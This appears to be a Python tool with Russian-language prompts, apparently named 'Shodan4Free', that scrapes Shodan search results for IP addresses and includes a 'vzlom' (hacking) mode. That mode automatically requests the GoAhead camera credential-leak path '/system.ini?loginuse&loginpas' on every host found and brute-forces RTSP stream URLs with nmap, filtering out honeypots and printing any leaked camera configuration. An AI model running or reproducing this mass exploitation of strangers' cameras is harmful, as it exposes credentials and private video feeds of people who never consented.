import re
import requests
import urllib.parse
import signal
import sys
import colorama
import json
from requests.exceptions import ConnectTimeout, ConnectionError
import nmap

colorama.init(autoreset=True)

def exit_handler(signal, frame):
    print(colorama.Fore.RED + 'Вы нажали Ctrl+C')
    sys.exit(0)

def vzlom_args_help():
    print("Хотите ли вы доп. фильтры для камер?")
    print("Примеры:")
    print("country:RU")
    print('geo:"xx.xxxxxx,xx.xxxxxx"')
    print('org:"PJSC ROSTELECOM"')

def show_help():
    print()
    print("Для использования этой программы вам не нужен ни аккаунт shodan, ни подписка,")
    print("всё сразу работает и вы даже можете пользоваться фильтрами shodan, обычно")
    print("доступными только по подписке (tag, vuln ...)")
    print("Если вы умеете пользоваться shodan.io, просто вводите обычные shodan запросы.")
    print("Для основных (и не только) shodan запросов смотрите :")
    print("https://help.shodan.io/the-basics/search-query-fundamentals")
    print("https://github.com/jakejarvis/awesome-shodan-queries")
    print("https://ia903408.us.archive.org/7/items/shodan-book-extras/shodan/shodan.pdf")
    print("https://www.stationx.net/how-to-use-shodan/")
    print("https://www.shodan.io/search/examples")
    print()
    print("Для использования internetdb введите internetdb")
    print("Для автоматического нахождения и эксплуатации уязвимых устройств введите vzlom")

def search_shodan(query, filter_honeypot):
    if filter_honeypot:
        encoded_query = urllib.parse.quote_plus(f"{query} -tag:honeypot")
    else:
        encoded_query = urllib.parse.quote_plus(query)

    shodan_url = f"https://www.shodan.io/search/facet?query={encoded_query}&facet=ip"
    try:
        resp = requests.get(shodan_url)
        resp.raise_for_status()
        return re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", resp.text)
    except requests.RequestException as e:
        print(colorama.Fore.RED + f"Ошибка при запросе к Shodan: {e}")
        return []

def search_internetdb(ip):
    url = f"https://internetdb.shodan.io/{ip}"
    try:
        response = requests.get(url)
        response.raise_for_status()
        return json.dumps(response.json(), indent=2)
    except requests.RequestException as e:
        return colorama.Fore.RED + f"Ошибка при запросе к InternetDB: {e}"

def goahead(arguments, filter_honeypot):
    if arguments == "":
        if filter_honeypot:
            goahead_query = 'realm=GoAhead port:81 -tag:honeypot'
        else:
            goahead_query = 'realm=GoAhead port:81'
    else:
        if filter_honeypot:
            goahead_query = f'realm=GoAhead port:81 -tag:honeypot {arguments}'
        else:
            goahead_query = f'realm=GoAhead port:81 {arguments}'
    encoded_query = urllib.parse.quote_plus(goahead_query)
    response = requests.get(f"https://www.shodan.io/search/facet?query={encoded_query}&facet=ip")
    html_text = response.content.decode('utf-8')

    ip_pattern = r"\b(?:\d{1,3}\.){3}\d{1,3}\b"
    ips = re.findall(ip_pattern, html_text)

    print(ips)

    for ip in ips:
        print()
        try:
            response = requests.get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=5)
            if response.status_code == 200:

                print(colorama.Fore.GREEN + "________________________________________________")
                print(colorama.Fore.GREEN + f"IP address : {ip}")
                print(colorama.Fore.GREEN + f"Response : {response.text}")
                print(colorama.Fore.GREEN + "________________________________________________")
            else:
                print(colorama.Fore.RED + f"This camera is secure : {ip}")
        except ConnectTimeout:
            print(colorama.Fore.RED + "Timeout!")
            continue
        except ConnectionError as e:
            print(colorama.Fore.RED + "Connection error!")
            continue
        except Exception as e:
            print(colorama.Fore.RED + "Unknown error!")
            continue

def rtsp(arguments, filter_honeypot):
    if arguments == "":
        if filter_honeypot:
            rtsp_query = "port:554 -tag:honeypot"
        else:
            rtsp_query = "port:554"
    else:
        if filter_honeypot:
            rtsp_query = f"port:554 -tag:honeypot {arguments}"
        else:
            rtsp_query = f"port:554 {arguments}"
    encoded_query = urllib.parse.quote_plus(rtsp_query)

    response = requests.get(f"https://www.shodan.io/search/facet?query={encoded_query}&facet=ip")
    html_text = response.content.decode('utf-8')

    ip_pattern = r"\b(?:\d{1,3}\.){3}\d{1,3}\b"
    ips = re.findall(ip_pattern, html_text)

    print(ips)

    nm = nmap.PortScanner()

    for ip in ips:
        print(colorama.Fore.RESET + "________________________________________________")
        print(f"IP address : {ip}")
        print()

        try:
            nm.scan(hosts=ip, arguments='-p 554 --script="rtsp-url-brute" -Pn')

            if ip in nm.all_hosts():
                if 'tcp' in nm[ip] and 554 in nm[ip]['tcp']:
                    port_info = nm[ip]['tcp'][554]

                    print(f"Порт 554/{port_info['name']} - {port_info['state']}")

                    if 'script' in port_info:
                        print("\nРезультаты rtsp-url-brute:")
                        if "discovered" in port_info['script']['rtsp-url-brute']:
                            print(colorama.Fore.GREEN + port_info['script']['rtsp-url-brute'])
                        else:
                            print(colorama.Fore.RED + port_info['script']['rtsp-url-brute'])
                    else:
                        print(colorama.Fore.RED + "Скрипт не вернул результатов")
                else:
                    print(colorama.Fore.RED + "Порт 554 закрыт или не отвечает")
            else:
                print(colorama.Fore.RED + "Хост не ответил на сканирование")

        except Exception as e:
            print(f"Ошибка сканирования: {str(e)}")

        print(colorama.Fore.RESET + "________________________________________________")

def main():
    signal.signal(signal.SIGINT, exit_handler)

    honeypots = input("Хотите ли вы фильтровать honeypots в этой сессии (рекомендовано) [Y/n] : ")

    if honeypots == "Y" or honeypots == "y" or honeypots == "":
        filter_honeypot = True
    elif honeypots == "N" or honeypots == "n":
        filter_honeypot = False
    else:
        print("Введите Y или n")
        return

    print("Если вы не знаете как использовать эту программу, введите 'help'")
    print("Если вы хотите напрямую использовать internetdb, введите internetdb")

    while True:
        query = input(colorama.Fore.GREEN + "root@Shodan4Free # ")

        if query == "internetdb":
            print("Просто введите IP адрес")
            idb_ip = input(colorama.Fore.GREEN + "root@InternetDB # ")
            if idb_ip:
                print(search_internetdb(idb_ip))
            continue
        elif query == 'help':
            show_help()
            continue
        elif query == "vzlom":
            print(colorama.Fore.GREEN + "Для помощи введите 'help'")
            vzlom_query = input(colorama.Fore.GREEN + "root@vzlom # ")
            if vzlom_query == "goahead":
                vzlom_args_help()
                arguments = input(colorama.Fore.GREEN + "Доп. фильтры : ")
                goahead(arguments, filter_honeypot)
                continue
            elif vzlom_query == "rtsp":
                vzlom_args_help()
                arguments = input(colorama.Fore.GREEN + "Доп. фильтры : ")
                rtsp(arguments, filter_honeypot)
                continue
            elif vzlom_query == "help":
                print(colorama.Fore.GREEN + "_________________________________________________________")
                print(colorama.Fore.GREEN + "|Команды     | что делает                               |")
                print(colorama.Fore.GREEN + "|goahead     | автоматический взлом ip камер goahead    |")
                print(colorama.Fore.GREEN + "|rtsp        | автоматический взлом rtsp камер")
                print(colorama.Fore.GREEN + "_________________________________________________________")
                print("Чтобы войти в vzlom, введите vzlom")
                continue
                continue
            elif not vzlom_query:
                continue

        if not query:
            continue

        ips = search_shodan(query, filter_honeypot)

        if not ips:
            print(colorama.Fore.YELLOW + "Не найдено IP-адресов по вашему запросу")
            continue

        for i, ip in enumerate(ips, 1):
            print(f"{i}) {ip}")

        while True:
            IDB = input(f"Хотите ли вы использовать Shodan InternetDB [Y/n] : ")
            if IDB == "Y" or IDB == "y" or IDB == "":
                try:
                    ip_num = int(input(colorama.Fore.GREEN + "root@InternetDB # "))
                    if 1 <= ip_num <= len(ips):
                        print(search_internetdb(ips[ip_num-1]))
                        break
                    print(colorama.Fore.RED + f"Введите число от 1 до {len(ips)}")
                except ValueError:
                    print(colorama.Fore.RED + "Введите корректный номер")
            elif IDB == "N" or IDB == "n":
                break
            else:
                print("Введите Y или n")

if __name__ == "__main__":
    main()
